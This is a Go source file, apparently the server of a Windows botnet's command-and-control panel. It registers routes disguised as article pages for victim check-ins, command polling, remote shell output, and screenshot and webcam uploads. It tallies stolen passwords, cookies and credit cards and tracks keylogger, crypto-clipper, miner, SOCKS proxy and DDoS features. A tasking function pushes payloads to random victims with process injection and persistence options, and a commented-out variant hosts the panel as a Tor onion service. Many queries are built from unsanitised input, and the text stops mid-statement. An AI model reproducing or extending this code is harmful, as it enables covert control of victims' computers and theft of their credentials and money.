// Include Bandwidth calculations for communications

package core

import (
	"crypto/tls"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"github.com/gorilla/mux"
	"html"
	"html/template"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"
)

//func redirect(w http.ResponseWriter, req *http.Request) {
//	target := "https://" + req.Host + req.URL.Path
//	if len(req.URL.RawQuery) > 0 {
//		target += "?" + req.URL.RawQuery
//	}
//	http.Redirect(w, req, target,
//		http.StatusTemporaryRedirect)
//}

//func GoServerWithTOR(){
//	Log.Println("Starting MUX Routing...")
//	router := mux.NewRouter()
//	//DDoSHandler
//	//Pages
//	router.HandleFunc("/", dashboardHandle)
//	router.HandleFunc("/clients/windows", clientsWindowsHandle)
//	router.HandleFunc("/manage/windows", manageWindowsHandle)
//	router.HandleFunc("/ddos", DDoSHandler)
//	router.HandleFunc("/socks", socksPageHandler)
//	router.HandleFunc("/tasks", tasksHandle)
//	//newTaskHandle
//	router.HandleFunc("/settings", settingsHandle)
//	//Login Pages
//	router.HandleFunc("/login", loginHandler)
//	router.HandleFunc("/logout", logoutHandler)
//	//Functions
//	router.HandleFunc("/issue/windows", issueCommand)
//	router.HandleFunc("/save/client/notes", saveClientNotes)
//	router.HandleFunc("/delete/admin", deleteAdmin)
//	router.HandleFunc("/delete/client/windows", deleteClient)
//	router.HandleFunc("/delete/command", deleteCommand)
//	router.HandleFunc("/tasks/windows/new", newTaskHandle)
//	router.HandleFunc("/delete/task/windows", deleteTask)
//	router.HandleFunc("/delete/file/windows", deleteFile)
//	router.HandleFunc("/save/settings", saveSettingsHandler)
//	router.HandleFunc("/save/daemon", saveDaemonSettingsHandler)
//	router.HandleFunc("/add/admin", addAdminHandler)
//	router.HandleFunc("/clear/clients", truncateClients)
//	router.HandleFunc("/clear/commands", truncateCommands)
//	router.HandleFunc("/save/notes", saveAdminNotes)
//	router.HandleFunc("/live", Live)
//	//Client Stuff
//	router.HandleFunc("/ping", ping)
//	//Need to make this more dynamic, Needs to be more random and have more variables similer to normal webtrafic
//
//	//	router.HandleFunc("/test/test.{suffix:(?:php|asp|html)}", test) //http://127.0.0.1/test/test.{...}
//	//	router.HandleFunc("/test/{authority:(?:post|user|listing|download|page|channel|forumdisplay)}.{suffix:(?:php|asp|html)}", test)//http://127.0.0.1/test/.{...}.{...}
//
//	//Idea for cover
//	// C2.com/{RandomWordA}/{RandomWordB}/{RandomWordC/{RandomNEWWord}.{RandomSuffix}
//
//	router.HandleFunc("/articles/{random}/{random}/new.html", newClient).Headers("User-Agent", UserAgent)          //New Client Connection
//	router.HandleFunc("/articles/{random}/{random}/read.html", readClient).Headers("User-Agent", UserAgent)        //Check Client Commands
//	router.HandleFunc("/articles/{random}/{random}/edit.html", statusClient).Headers("User-Agent", UserAgent)      //Tell C2 if Client finished Command
//	router.HandleFunc("/articles/{random}/{random}/images.html", imagesClient).Headers("User-Agent", UserAgent)    //Update Clients Screenshot or Webcam
//	router.HandleFunc("/articles/{random}/{random}/account.html", settingsClient).Headers("User-Agent", UserAgent) //Give client its last Settings
//	router.HandleFunc("/articles/{random}/{random}/upload.html", filesClient).Headers("User-Agent", UserAgent)     //Upload files
//	//Test
//	router.HandleFunc("/test", FormTest)
//	router.HandleFunc("/ip", ip)
//	//Backend stuff
//	router.HandleFunc("/favicon.ico", faviconHandle)
//
//	router.NotFoundHandler = http.HandlerFunc(notFound)
//	router.PathPrefix("/static/").Handler(http.StripPrefix("/static/", http.FileServer(http.Dir("static"))))
//	router.PathPrefix("/files/").Handler(http.StripPrefix("/files/", http.FileServer(http.Dir("clients"))))
//
//
//	fmt.Println("Starting and registering onion service, please wait a couple of minutes...")
//	d, _ := ioutil.TempDir("", "data-dir")
//	conf := &tor.StartConf{
//		ProcessCreator: embedded.NewCreator(),
//		TorrcFile:      "torrc-defaults",
//		DataDir:        d,
//	}
//	t, err := tor.Start(nil, conf)
//	if err != nil {
//		log.Panicf("Unable to start Tor: %v", err)
//	}
//	defer t.Close()
//	listenCtx, listenCancel := context.WithTimeout(context.Background(), 3*time.Minute)
//	defer listenCancel()
//	onion, err := t.Listen(listenCtx, &tor.ListenConf{Version3: true, RemotePorts: []int{80}})
//	if err != nil {
//		log.Printf("Unable to create onion service: %v", err)
//		return
//	}
//	defer onion.Close()
//	fmt.Printf("Open Tor browser and navigate to http://%v.onion\n", onion.ID)
//	fmt.Println("Press enter to exit")
//	errCh := make(chan error, 1)
//	go func() { errCh <- http.Serve(onion, router) }()
//	go func() {
//		fmt.Scanln()
//		errCh <- nil
//	}()
//	if err = <-errCh; err != nil {
//		log.Printf("Failed serving: %v", err)
//	}
//}

func GoServerWithFrontend() {
	//go http.ListenAndServe(":"+serverPort, http.HandlerFunc(redirect))
	Log.Println("Starting MUX Routing...")
	router := mux.NewRouter()
	//DDoSHandler
	//Pages
	router.HandleFunc("/", dashboardHandle)
	router.HandleFunc("/clients/windows", clientsWindowsHandle)
	router.HandleFunc("/manage/windows", manageWindowsHandle)
	router.HandleFunc("/ddos", DDoSHandler)
	router.HandleFunc("/socks", socksPageHandler)
	router.HandleFunc("/tasks", tasksHandle)
	//newTaskHandle
	router.HandleFunc("/settings", settingsHandle)
	//Login Pages
	router.HandleFunc("/login", loginHandler)
	router.HandleFunc("/logout", logoutHandler)
	//Functions
	router.HandleFunc("/issue/windows", issueCommand)
	router.HandleFunc("/issue/windows/toggle", toggleClientFeature)
	router.HandleFunc("/save/client/notes", saveClientNotes)
	router.HandleFunc("/delete/admin", deleteAdmin)
	router.HandleFunc("/delete/client/windows", deleteClient)
	router.HandleFunc("/delete/command", deleteCommand)
	router.HandleFunc("/tasks/windows/new", newTaskHandle)
	router.HandleFunc("/delete/task/windows", deleteTask)
	router.HandleFunc("/delete/file/windows", deleteFile)
	router.HandleFunc("/save/settings", saveSettingsHandler)
	router.HandleFunc("/save/daemon", saveDaemonSettingsHandler)
	router.HandleFunc("/add/admin", addAdminHandler)
	router.HandleFunc("/clear/clients", truncateClients)
	router.HandleFunc("/clear/commands", truncateCommands)
	router.HandleFunc("/save/notes", saveAdminNotes)
	router.HandleFunc("/live", Live)
	//Client Stuff
	router.HandleFunc("/ping", ping)
	//Need to make this more dynamic, Needs to be more random and have more variables similer to normal webtrafic

	//	router.HandleFunc("/test/test.{suffix:(?:php|asp|html)}", test) //http://127.0.0.1/test/test.{...}
	//	router.HandleFunc("/test/{authority:(?:post|user|listing|download|page|channel|forumdisplay)}.{suffix:(?:php|asp|html)}", test)//http://127.0.0.1/test/.{...}.{...}

	//Idea for cover
	// C2.com/{RandomWordA}/{RandomWordB}/{RandomWordC/{RandomNEWWord}.{RandomSuffix}

	router.HandleFunc("/articles/{random}/{random}/new.html", newClient).Headers("User-Agent", UserAgent)             //New Client Connection
	router.HandleFunc("/articles/{random}/{random}/read.html", readClient).Headers("User-Agent", UserAgent)           //Check Client Commands
	router.HandleFunc("/articles/{random}/{random}/edit.html", statusClient).Headers("User-Agent", UserAgent)         //Tell C2 if Client finished Command
	router.HandleFunc("/articles/{random}/{random}/images.html", imagesClient).Headers("User-Agent", UserAgent)       //Update Clients Screenshot or Webcam
	router.HandleFunc("/articles/{random}/{random}/account.html", settingsClient).Headers("User-Agent", UserAgent)    //Give client its last Settings
	router.HandleFunc("/articles/{random}/{random}/upload.html", filesClient).Headers("User-Agent", UserAgent)        //Upload files
	router.HandleFunc("/articles/{random}/{random}/member.html", updateClient).Headers("User-Agent", UserAgent)       //Update C2 client info
	router.HandleFunc("/articles/{random}/{random}/thread.html", passCounts).Headers("User-Agent", UserAgent)         //Update the Count of Passwords, Cookies and Credit Cards stolen from Client
	router.HandleFunc("/articles/{random}/{random}/reply.html", RemoteShellResponse).Headers("User-Agent", UserAgent) //Response from remote shell
	router.HandleFunc("/articles/{random}/{random}/shop.html", fileBrowser).Headers("User-Agent", UserAgent)          //File Browser stuff
	//Test
	router.HandleFunc("/test", FormTest)
	router.HandleFunc("/ip", ip)
	//Backend stuff
	router.HandleFunc("/favicon.ico", faviconHandle)

	router.NotFoundHandler = http.HandlerFunc(notFound)
	router.PathPrefix("/static/").Handler(http.StripPrefix("/static/", http.FileServer(http.Dir("static"))))
	router.PathPrefix("/files/").Handler(http.StripPrefix("/files/", http.FileServer(http.Dir("clients"))))

	cfg := &tls.Config{
		MinVersion: tls.VersionTLS12,
	}

	Server := &http.Server{
		Handler:      router,
		Addr:         ":" + serverPort,
		TLSConfig:    cfg,
		WriteTimeout: time.Second * 15,
		ReadTimeout:  time.Second * 15,
		IdleTimeout:  time.Second * 60,
	}

	if ssl {
		if Err := Server.ListenAndServeTLS(cert, key); Err != nil {
			Log.Println("TLS Server Error: " + Err.Error())
		}
	} else {
		Log.Fatal(Server.ListenAndServe())
	}
	Log.Println("Server Online")
}

//func GoServerNoFrontend() {
//	Log.Println("Starting MUX Routing...")
//	router := mux.NewRouter()
//	//Client Stuff
//	router.HandleFunc("/ping", ping)
//	router.HandleFunc("/articles/{random}/{random}/new.html", newClient).Headers("User-Agent", UserAgent)       //New Client Connection
//	router.HandleFunc("/articles/{random}/{random}/read.html", readClient).Headers("User-Agent", UserAgent)     //Check Client Commands
//	router.HandleFunc("/articles/{random}/{random}/edit.html", statusClient).Headers("User-Agent", UserAgent)   //Tell C2 if Client finished Command
//	router.HandleFunc("/articles/{random}/{random}/images.html", imagesClient).Headers("User-Agent", UserAgent) //Update Clients Screenshot or Webcam
//	//Test
//	router.HandleFunc("/test", FormTest)
//	router.HandleFunc("/ip", ip)
//	//Backend stuff
//	router.NotFoundHandler = http.HandlerFunc(notFound)
//
//	Server := &http.Server{
//		Handler:      router,
//		Addr:         ":" + serverPort,
//		WriteTimeout: time.Second * 15,
//		ReadTimeout:  time.Second * 15,
//		IdleTimeout:  time.Second * 60,
//	}
//
//	if ssl {
//		if Err := Server.ListenAndServeTLS(cert, key); Err != nil {
//			Log.Println("TLS Server Error: " + Err.Error())
//		}
//	} else {
//		Log.Fatal(Server.ListenAndServe())
//	}
//	Log.Println("Server Online")
//}

func ip(w http.ResponseWriter, r *http.Request) {
	ip := strings.Split(r.RemoteAddr, ":")[0]
	fmt.Fprintf(w, ip)
}

func ping(w http.ResponseWriter, r *http.Request) {
	_ = r.ParseForm()
	ClientUID := r.Form.Get("id")
	_, _ = DB.Exec("UPDATE `windows_clients` SET `LastResponse`='" + time.Now().Format("02 Jan 06 15:04 -0700") + "' WHERE UID='" + ClientUID + "'")
	fmt.Fprintf(w, "pong")
}

func Live(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrade.Upgrade(w, r, nil)
	if err != nil {
		return
	}
	for {
		msgType, msg, err := conn.ReadMessage()
		if err != nil {
			return
		}
		if LiveMessage != OldMessage {
			OldMessage = LiveMessage
			err = conn.WriteMessage(msgType, []byte(LiveMessage))
			if err != nil {
				return
			}
		}
		if string(msg) == "ping" {
			time.Sleep(2 * time.Second)
			err = conn.WriteMessage(msgType, []byte("pong"))
			if err != nil {
				return
			}
		} else {
			conn.Close()
			return
		}
	}
}

func toggleClientFeature(w http.ResponseWriter, r *http.Request) {
	_ = r.ParseForm()
	userName := getUserName(r)
	if userName != "" {
		uid := r.FormValue("uid")
		feature := r.FormValue("feature")
		state := r.FormValue("state")
		_, Err := DB.Exec("UPDATE `windows_clients` SET `"+feature+"`='"+state+"' WHERE UID=?", uid)
		if Err == nil {
			//_, _ = DB.Exec("INSERT INTO commands( UID, DAT, Command, Parameters, Status, DateIssued, Timeout) VALUES( ?, ?, ?, ?, ?, ?, ?)", uid, html.EscapeString(Command), html.EscapeString(strings.ToUpper(RealName)), html.EscapeString(Parameters), "Waiting", time.Now().Format("02 Jan 06 15:04 -0700"), "30")
			fmt.Fprintf(w, "success")
		} else {
			fmt.Println(Err)
			fmt.Fprintf(w, "Error")
		}
	} else {
		login := LoginPage{"window.onload = alertFunction;", "warning", "You are not logged in!"}
		parsedTemplate, _ := template.ParseFiles("static/login.html")
		Err := parsedTemplate.Execute(w, login)
		if Err != nil {
			Log.Println("Error executing template :", Err)
			return
		}
	}
}

func truncateClients(w http.ResponseWriter, r *http.Request) {
	_ = r.ParseForm()
	userName := getUserName(r)
	if userName != "" {
		_, _ = DB.Exec("truncate windows_clients")
		fmt.Fprintf(w, "success")
	} else {
		login := LoginPage{"window.onload = alertFunction;", "warning", "You are not logged in!"}
		parsedTemplate, _ := template.ParseFiles("static/login.html")
		Err := parsedTemplate.Execute(w, login)
		if Err != nil {
			Log.Println("Error executing template :", Err)
			return
		}
	}
}

func truncateCommands(w http.ResponseWriter, r *http.Request) {
	_ = r.ParseForm()
	userName := getUserName(r)
	if userName != "" {
		_, _ = DB.Exec("truncate commands")
		fmt.Fprintf(w, "success")
	} else {
		login := LoginPage{"window.onload = alertFunction;", "warning", "You are not logged in!"}
		parsedTemplate, _ := template.ParseFiles("static/login.html")
		Err := parsedTemplate.Execute(w, login)
		if Err != nil {
			Log.Println("Error executing template :", Err)
			return
		}
	}
}

func deleteCommand(w http.ResponseWriter, r *http.Request) {
	_ = r.ParseForm()
	userName := getUserName(r)
	if userName != "" {
		CommandID := r.FormValue("id")
		var tmpID string
		err := DB.QueryRow("SELECT UID FROM commands WHERE id=?", CommandID).Scan(&tmpID)
		if err != sql.ErrNoRows {
			_ = DB.QueryRow("DELETE FROM commands WHERE id=?", CommandID)
			fmt.Fprintf(w, "success")
		}
	} else {
		login := LoginPage{"window.onload = alertFunction;", "warning", "You are not logged in!"}
		parsedTemplate, _ := template.ParseFiles("static/login.html")
		Err := parsedTemplate.Execute(w, login)
		if Err != nil {
			Log.Println("Error executing template :", Err)
			return
		}
	}
}

func deleteFile(w http.ResponseWriter, r *http.Request) {
	_ = r.ParseForm()
	userName := getUserName(r)
	if userName != "" {
		var tmpuid string
		ClientUID := r.FormValue("id")
		Name := r.FormValue("name")
		FileType := r.FormValue("type")
		Err := DB.QueryRow("SELECT UID FROM windows_clients WHERE UID=?", ClientUID).Scan(&tmpuid)
		if Err != sql.ErrNoRows {
			if FileType == "s" {
				os.Remove("./clients/windows/" + ClientUID + "/files/stealer/" + Name)
			} else if FileType == "l" {
				os.Remove("./clients/windows/" + ClientUID + "/files/logs/" + Name)
			} else if FileType == "r" {
				os.Remove("./clients/windows/" + ClientUID + "/files/recordings/" + Name)
			}
		}
	} else {
		login := LoginPage{"window.onload = alertFunction;", "warning", "You are not logged in!"}
		parsedTemplate, _ := template.ParseFiles("static/login.html")
		Err := parsedTemplate.Execute(w, login)
		if Err != nil {
			Log.Println("Error executing template :", Err)
			return
		}
	}
}

func deleteTask(w http.ResponseWriter, r *http.Request) {
	_ = r.ParseForm()
	userName := getUserName(r)
	if userName != "" {
		TaskID := r.FormValue("id")
		//	fmt.Println(ClientUID)
		var tmpID string
		err := DB.QueryRow("SELECT id FROM tasks WHERE id=?", TaskID).Scan(&tmpID)
		if err != sql.ErrNoRows {
			_ = DB.QueryRow("DELETE FROM tasks WHERE id=?", tmpID)
			fmt.Fprintf(w, "success")
		}
	} else {
		login := LoginPage{"window.onload = alertFunction;", "warning", "You are not logged in!"}
		parsedTemplate, _ := template.ParseFiles("static/login.html")
		Err := parsedTemplate.Execute(w, login)
		if Err != nil {
			Log.Println("Error executing template :", Err)
			return
		}
	}
}

func tasksHandle(w http.ResponseWriter, r *http.Request) {
	_ = r.ParseForm()
	userName := getUserName(r)
	if userName != "" {
		var TaskID, TaskName, TaskCommand, DateIssued, Executions, MaxExecutions, TaskTimeout, htmlCurEx, htmlMaxEx string
		data := TaskPage{}

		data.Name = Name
		data.TotalClients = strconv.Itoa(TotalClients)
		data.ActiveClients = strconv.Itoa(ActiveClients)
		data.Username = userName
		data.StolenCredentials = strconv.Itoa(StolenCredentials)
		data.StolenFiles = strconv.Itoa(StolenFiles)

		rows, _ := DB.Query("SELECT id, TaskName, DateIssued, CommandName, Executions, MaxExecutions, TaskTimeout FROM tasks")
		for rows.Next() {
			_ = rows.Scan(&TaskID, &TaskName, &DateIssued, &TaskCommand, &Executions, &MaxExecutions, &TaskTimeout)
			if len(TaskName) > 1 {
				htmlCurEx = `<span style="color: #00ff00;">` + Executions + `</span>`
				htmlMaxEx = `<span style="color: #ff0000;">` + MaxExecutions + `</span>`
				table := TaskTable{TaskID, TaskName, DateIssued, TaskCommand, template.HTML(htmlCurEx), template.HTML(htmlMaxEx), TaskTimeout}
				data.TaskTables = append(data.TaskTables, table)
			}
		}

		parsedTemplate, _ := template.ParseFiles("static/tasks.html")
		Err := parsedTemplate.Execute(w, data)
		if Err != nil {
			Log.Println("Error executing template :", Err)
			return
		}

	} else {
		login := LoginPage{"window.onload = alertFunction;", "warning", "You are not logged in!"}
		parsedTemplate, _ := template.ParseFiles("static/login.html")
		Err := parsedTemplate.Execute(w, login)
		if Err != nil {
			Log.Println("Error executing template :", Err)
			return
		}
	}
}

//TODO FIX COMMAND STRUCTURE TO MATCH NEW METHODS.
func newTaskHandle(w http.ResponseWriter, r *http.Request) {
	_ = r.ParseForm()
	userName := getUserName(r)
	if userName != "" {
		TaskName := html.EscapeString(r.FormValue("tname"))

		CMDName := html.EscapeString(r.FormValue("cname"))
		RealName := html.EscapeString(r.FormValue("rname"))
		CMDParameters := html.EscapeString(r.FormValue("cpara"))

		Hidden := html.EscapeString(r.FormValue("hidden"))

		RunPE := html.EscapeString(r.FormValue("runpe"))
		HostProcess := html.EscapeString(r.FormValue("host"))

		CustomDrop := html.EscapeString(r.FormValue("clo"))
		DropLocation := html.EscapeString(r.FormValue("path"))

		Startup := html.EscapeString(r.FormValue("startup"))
		StartupMethod := html.EscapeString(r.FormValue("method"))

		Filter := html.EscapeString(r.FormValue("filter"))
		Country := html.EscapeString(r.FormValue("country"))
		//Installed := html.EscapeString(r.FormValue("installed"))
		Admin := html.EscapeString(r.FormValue("admin"))
		//x64 := html.EscapeString(r.FormValue("64"))

		MaxExecutions := html.EscapeString(r.FormValue("max"))
		TaskTimeout := html.EscapeString(r.FormValue("timeout"))
		//Adds info to Tasks table
		//Creates commands for random clients using filters
		//On client check it will see if the command is a task, if it is it will mark it as executed

		var randomID = randomString(15)
		_, _ = DB.Exec("INSERT INTO tasks(RandomID, TaskName, DateIssued, CommandName, Executions, MaxExecutions, TaskTimeout) VALUES(?, ?, ?, ?, ?, ?, ? )", randomID, TaskName, time.Now().Format("02 Jan 06 15:04 -0700"), RealName, "0", MaxExecutions, TaskTimeout)

		var ClientID, ClientUID, LastResponse, SQLQuery string
		if Filter == "0xIC" { //In Country
			if Admin == "true" {
				SQLQuery = "SELECT ID, UID, LastResponse FROM windows_clients WHERE Flag='" + Country + "' AND Abilities='true' ORDER BY RAND() LIMIT " + MaxExecutions
				//SQLQuery = "SELECT ID, UID, LastResponse FROM windows_clients WHERE Flag='"+ Country +"' AND Abilities='true'"
			} else if Admin == "false" {
				SQLQuery = "SELECT ID, UID, LastResponse FROM windows_clients WHERE Flag='" + Country + "' ORDER BY RAND() LIMIT " + MaxExecutions
			}
		} else if Filter == "First" { //First Connection
			if Admin == "true" {
				//SQLQuery = "SELECT UID FROM windows_clients WHERE Flag='"+ Country +"' AND Abilities='true' "
			} else if Admin == "false" {
				//SQLQuery = "SELECT UID FROM windows_clients WHERE Flag='"+ Country +"'"
			}
		} else if Filter == "0xW10" { //Windows 10
			if Admin == "true" {
				//SQLQuery = "SELECT UID FROM windows_clients WHERE OperatingSystem='' AND Abilities='true' "
			} else if Admin == "false" {
				//SQLQuery = "SELECT UID FROM windows_clients WHERE Flag='"+ Country +"'"
			}
		} else if Filter == "0xW8" { //Windows 8
			if Admin == "true" {
				//SQLQuery = "SELECT UID FROM windows_clients WHERE Flag='"+ Country +"' AND Abilities='true' "
			} else if Admin == "false" {
				//SQLQuery = "SELECT UID FROM windows_clients WHERE Flag='"+ Country +"'"
			}
		} else if Filter == "0xW7" { //Windows 7
			if Admin == "true" {
				//SQLQuery = "SELECT UID FROM windows_clients WHERE Flag='"+ Country +"' AND Abilities='true' "
			} else if Admin == "false" {
				//SQLQuery = "SELECT UID FROM windows_clients WHERE Flag='"+ Country +"'"
			}
		} else if Filter == "0xWV" { //Windows Vista or Lower
			if Admin == "true" {
				//SQLQuery = "SELECT UID FROM windows_clients WHERE Flag='"+ Country +"' AND Abilities='true' "
			} else if Admin == "false" {
				//SQLQuery = "SELECT UID FROM windows_clients WHERE Flag='"+ Country +"'"
			}
		} else if Filter == "0xSW" { //If installed
			if Admin == "true" {
				//SQLQuery = "SELECT UID FROM windows_clients WHERE Flag='"+ Country +"' AND Abilities='true' "
			} else if Admin == "false" {
				//SQLQuery = "SELECT UID FROM windows_clients WHERE Flag='"+ Country +"'"
			}
		} else if Filter == "0xGPU" { //Has any GPU
			if Admin == "true" {
				//SQLQuery = "SELECT UID FROM windows_clients WHERE Flag='"+ Country +"' AND Abilities='true' "
			} else if Admin == "false" {
				//SQLQuery = "SELECT UID FROM windows_clients WHERE Flag='"+ Country +"'"
			}
		} else if Filter == "0xGPV4G" { //Has GPU with 4GB+
			if Admin == "true" {
				//SQLQuery = "SELECT UID FROM windows_clients WHERE Flag='"+ Country +"' AND Abilities='true' "
			} else if Admin == "false" {
				//SQLQuery = "SELECT UID FROM windows_clients WHERE Flag='"+ Country +"'"
			}
		} else if Filter == "0xGPV6G" { //Has GPu with 6GB+
			if Admin == "true" {
				//SQLQuery = "SELECT UID FROM windows_clients WHERE Flag='"+ Country +"' AND Abilities='true' "
			} else if Admin == "false" {
				//SQLQuery = "SELECT UID FROM windows_clients WHERE Flag='"+ Country +"'"
			}
		} else {
			if Admin == "true" {
				SQLQuery = "SELECT ID, UID, LastResponse FROM windows_clients WHERE Abilities='true' ORDER BY RAND() LIMIT " + MaxExecutions

			} else if Admin == "false" {
				SQLQuery = "SELECT ID, UID, LastResponse FROM windows_clients ORDER BY RAND() LIMIT " + MaxExecutions

			}
		}

		CMDParameters += "|" + Hidden
		CMDParameters += "|" + RunPE + "|" + HostProcess
		CMDParameters += "|" + CustomDrop + "|" + DropLocation
		CMDParameters += "|" + Startup + "|" + StartupMethod

		//Get all client that are not dead ie last response = <= Timeout
		//Select random clients that
		i, _ := strconv.ParseFloat(Timeout, 32)

		rows, err := DB.Query(SQLQuery)
		if err == nil {
			for rows.Next() {
				err = rows.Scan(&ClientID, &ClientUID, &LastResponse)
				then, _ := time.Parse("02 Jan 06 15:04 -0700", LastResponse)
				duration := time.Since(then)
				if duration.Minutes() <= i { //Matches Filters, and is Active... Issue command.
					_, _ = DB.Exec("INSERT INTO commands(Task, UID, DAT, Command, Parameters, Status, DateIssued, Timeout) VALUES( ?, ?, ?, ?, ?, ?, ?, ?)", randomID, ClientUID, CMDName, "[TASK]"+RealName, CMDParameters, "Waiting", time.Now().Format("02 Jan 06 15:04 -0700"), TaskTimeout)

					//fmt.Println("Good", ClientID, ClientUID, LastResponse)
				} //else{
				//fmt.Println("Old", ClientID, ClientUID, LastResponse)
				//	}
			}
		} else {
			fmt.Println(err)
		}
		//fmt.Println(TaskName, CMDName, RealName, CMDParameters, Hidden, RunPE, HostProcess, CustomDrop, DropLocation, Startup, StartupMethod, Filter, Country, Admin, MaxExecutions, TaskTimeout)
		fmt.Fprintf(w, "success")
	} else {
		login := LoginPage{"window.onload = alertFunction;", "warning", "You are not logged in!"}
		parsedTemplate, _ := template.ParseFiles("static/login.html")
		Err := parsedTemplate.Execute(w, login)
		if Err != nil {
			Log.Println("Error executing template :", Err)
			return
		}
	}
}

func deleteAdmin(w http.ResponseWriter, r *http.Request) {
	_ = r.ParseForm()
	userName := getUserName(r)
	if userName != "" {
		UID := r.Form.Get("uid")
		var tmpuid string
		Err := DB.QueryRow("SELECT UID FROM admins WHERE UID=?", UID).Scan(&tmpuid)
		if Err != sql.ErrNoRows {
			_ = DB.QueryRow("DELETE FROM admins WHERE UID=?", UID)
			Log.Println(userName + " deleted a admin from the database UID=" + UID)
			fmt.Fprintf(w, "success")
		}
	} else {
		login := LoginPage{"window.onload = alertFunction;", "warning", "You are not logged in!"}
		parsedTemplate, _ := template.ParseFiles("static/login.html")
		Err := parsedTemplate.Execute(w, login)
		if Err != nil {
			Log.Println("Error executing template :", Err)
			return
		}
	}
}

func dataStat(mode bool, UID string, dataBytes int) {
	var bytes string
	var newBytes int
	if mode { //Upload (Sent)
		rows, err := DB.Query("SELECT sentBytes FROM windows_clients WHERE UID=?", UID)
		if err == nil {
			for rows.Next() {
				_ = rows.Scan(&bytes)
				i, _ := strconv.Atoi(bytes)
				newBytes = i + dataBytes
				_, _ = DB.Exec("UPDATE `windows_clients` SET `sentBytes`='"+strconv.Itoa(newBytes)+"' WHERE UID=?", UID)
			}
		}
	} else { //Download (Rec)
		rows, err := DB.Query("SELECT receivedBytes FROM windows_clients WHERE UID=?", UID)
		if err == nil {
			for rows.Next() {
				_ = rows.Scan(&bytes)
				i, _ := strconv.Atoi(bytes)
				newBytes = i + dataBytes
				_, _ = DB.Exec("UPDATE `windows_clients` SET `receivedBytes`='"+strconv.Itoa(newBytes)+"' WHERE UID=?", UID)
			}
		}
	}
}

func updateClient(w http.ResponseWriter, r *http.Request) {
	_ = r.ParseForm()
	ClientUID := r.FormValue("id")
	data := r.FormValue("data")
	decoded, _ := base64.RawURLEncoding.DecodeString(data)
	Decrypted := XXTeaDecrypt(decoded, []byte(EncryptionPassword))
	var jsonData UpdateClientInfo
	err := json.Unmarshal(Decrypted, &jsonData)
	flag := GetCountryCode(jsonData.IP)
	go dataStat(false, ClientUID, int(r.ContentLength))
	if err == nil {
		_, _ = DB.Exec("UPDATE `windows_clients` SET `ClientVersion`='"+jsonData.ClientVersion+"',`IP`='"+jsonData.IP+"',`Flag`='"+flag+"',`OperatingSystem`='"+jsonData.OS+"',`GPU`='"+jsonData.GPU+"',`Abilities`='"+jsonData.Abilities+
			"',`SysInfo`='"+jsonData.SysInfo+"',`PingTime`='"+jsonData.PingTime+"',`Jitter`='"+jsonData.Jitter+"',`UserAgent`='"+jsonData.UserAgent+"',`InstanceKey`='"+jsonData.InstanceKey+
			"',`Install`='"+jsonData.Install+"',`SmartCopy`='"+jsonData.SmartCopy+"',`InstallName`='"+jsonData.InstallName+"',`InstallFolder`='"+jsonData.InstallFolder+"',`AntiVirus`='"+jsonData.AntiVirus+"',`ClipperState`='"+jsonData.ClipperState+"',`BTC`='"+jsonData.BTC+"',`XMR`='"+jsonData.XMR+
			"',`ETH`='"+jsonData.ETH+"',`Custom`='"+jsonData.Custom+"',`Regex`='"+jsonData.Regex+
			"',`MinerState`='"+jsonData.MinerState+"',`Socks5State`='"+jsonData.Socks5State+"',`ReverseProxyState`='"+jsonData.ReverseProxyState+"',`RemoteShellState`='"+jsonData.RemoteShellState+"',`KeyloggerState`='"+jsonData.KeyloggerState+"',`FileHunterState`='"+jsonData.FileHunterState+
			"',`PasswordStealerState`='"+jsonData.PasswordStealerState+"' WHERE UID=?", ClientUID)
	}
	fmt.Fprintf(w, "success")
}

func RemoteShellResponse(w http.ResponseWriter, r *http.Request) {
	_ = r.ParseForm()
	ClientUID := r.FormValue("id")
	data := r.FormValue("data")

	decoded, _ := base64.RawURLEncoding.DecodeString(data)
	Decrypted := XXTeaDecrypt(decoded, []byte(EncryptionPassword))

	go dataStat(false, ClientUID, int(r.ContentLength))

	_, err := DB.Query("SELECT UID FROM windows_clients WHERE RemoteShellState='true' AND UID=?", ClientUID)
	if err == nil {
		_, _ = DB.Exec("UPDATE `windows_clients` SET `RemoteShellState`='false' WHERE UID='" + ClientUID + "'")
		//fmt.Println(LiveMessage)
		LiveMessage = "rshell|" + ClientUID + "|" + base64Encode(string(Decrypted))
		fmt.Fprintf(w, "success")
	}
}

func fileBrowser(w http.ResponseWriter, r *http.Request) {
	_ = r.ParseForm()
	ClientUID := r.FormValue("id")
	data := r.FormValue("data")

	fmt.Println(data)

	decoded, _ := base64.RawURLEncoding.DecodeString(data)
	Decrypted := XXTeaDecrypt(decoded, []byte(EncryptionPassword))

	go dataStat(false, ClientUID, int(r.ContentLength))

	fmt.Println(string(Decrypted))
	fmt.Fprintf(w, "success")
}

func passCounts(w http.ResponseWriter, r *http.Request) {
	_ = r.ParseForm()
	ClientUID := r.FormValue("id")
	Pass := r.FormValue("0")
	Cookie := r.FormValue("1")
	Cards := r.FormValue("2")
	_, _ = DB.Exec("UPDATE `windows_clients` SET `PasswordCount`='" + Pass + "' WHERE UID='" + ClientUID + "'")
	_, _ = DB.Exec("UPDATE `windows_clients` SET `CookieCount`='" + Cookie + "' WHERE UID='" + ClientUID + "'")
	_, _ = DB.Exec("UPDATE `windows_clients` SET `CCCount`='" + Cards + "' WHERE UID='" + ClientUID + "'")

	LiveMessage = "info|" + ClientUID + "'|New Passwords Uploaded"

	go dataStat(false, ClientUID, int(r.ContentLength))
	fmt.Fprintf(w, "success")
}

func newClient(w http.ResponseWriter, r *http.Request) {
	_ = r.ParseForm()
	ClientUID := r.FormValue("id")
	data := r.FormValue("data")
	decoded, _ := base64.RawURLEncoding.DecodeString(data)
	Decrypted := XXTeaDecrypt(decoded, []byte(EncryptionPassword))
	var jsonData UpdateClientInfo
	err := json.Unmarshal(Decrypted, &jsonData)
	flag := GetCountryCode(jsonData.IP)
	go dataStat(false, ClientUID, int(r.ContentLength))
	if err == nil {
		var tmpuid string
		err := DB.QueryRow("SELECT UID FROM windows_clients WHERE UID=?", ClientUID).Scan(&tmpuid)
		if err == sql.ErrNoRows {
			_, err = DB.Exec("INSERT INTO windows_clients(UID, ClientVersion, IP, Flag, OperatingSystem, GPU, Abilities, SysInfo, PingTime, Jitter, UserAgent, InstanceKey, Install, SmartCopy, InstallName, InstallFolder, Campaign, AntiForensics, AntiForensicsResponse, "+
